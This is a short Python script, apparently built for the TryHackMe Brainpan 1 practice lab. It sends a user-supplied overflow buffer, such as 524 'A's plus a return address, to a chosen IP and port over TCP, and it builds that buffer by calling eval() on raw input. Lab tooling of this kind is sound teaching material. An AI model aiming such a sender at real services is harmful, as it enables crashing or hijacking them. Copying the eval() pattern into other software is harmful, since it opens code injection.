import sys
import socket

def display_banner():
    banner = r"""
                ___    __        
     ____  _  _<  /___/ /__      
    / __ \| |/_/ / __  / _ \     
   / /_/ />  </ / /_/ /  __/     
   \____/_/|_/_/\__,_/\___/      
    """
    print(banner)
    print("Author  : Ox1d3x3")
    print("Version : 0.8.3")
    print("Disclaimer: This fuzzer is made based on THM Brainpan 1 room.\n")

def get_target_info():
    try:
        ip = input("Enter the target IP address: ")
        port = int(input("Enter the target port: "))
        return ip, port
    except ValueError:
        print("Invalid input. Please enter a valid IP address and port.")
        sys.exit()

def get_buffer():
    use_bytes = input("Do you want to provide a buffer with bytes? (yes/no): ").strip().lower()
    if use_bytes == "yes":
        print("\n[!] Enter your buffer payload below. Example: b'A' * 524 + b'\\xf3\\x12\\x17\\x31'")
        try:
            user_input = input("Buffer payload: ")
            buffer = eval(user_input)  # Evaluating user input to create the buffer
            if not isinstance(buffer, bytes):
                raise ValueError("Payload must be a byte string (eg, b'A').")
            return buffer
        except Exception as e:
            print(f"[!] Invalid buffer input: {e}")
            sys.exit()
    elif use_bytes == "no":
        print("\n[!] Enter your buffer payload below. Example: 'A' * 524 + 'B' * 4")
        try:
            user_input = input("Buffer payload: ")
            buffer = eval(user_input)  # Evaluating user input to create the buffer
            if not isinstance(buffer, str):
                raise ValueError("Payload must be a regular string, no bytes (eg, 'A').")
            return buffer
        except Exception as e:
            print(f"[!] Invalid buffer input: {e}")
            sys.exit()
    else:
        print("[!] Invalid choice. Please enter 'yes' or 'no'.")
        sys.exit()

def send_payload(ip, port, buffer):
    try:
        # Add line break to ensure proper formatting
        if isinstance(buffer, str):
            payload = buffer + '\r\n'
            payload = payload.encode()  # Encode as bytes for sending
        else:
            payload = buffer + b'\r\n'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"[+] Sending payload with size: {len(buffer)} bytes")
        s.send(payload)
        s.close()
        print("[+] Payload sent successfully")
    except Exception as e:
        print(f"[!] Error sending payload: {e}")
        sys.exit()

def main():
    display_banner()

    # Get user input for IP and port
    target_ip, target_port = get_target_info()

    # Get the buffer from the user
    buffer = get_buffer()

    # Send the payload to the target
    send_payload(target_ip, target_port, buffer)

if __name__ == "__main__":
    main()
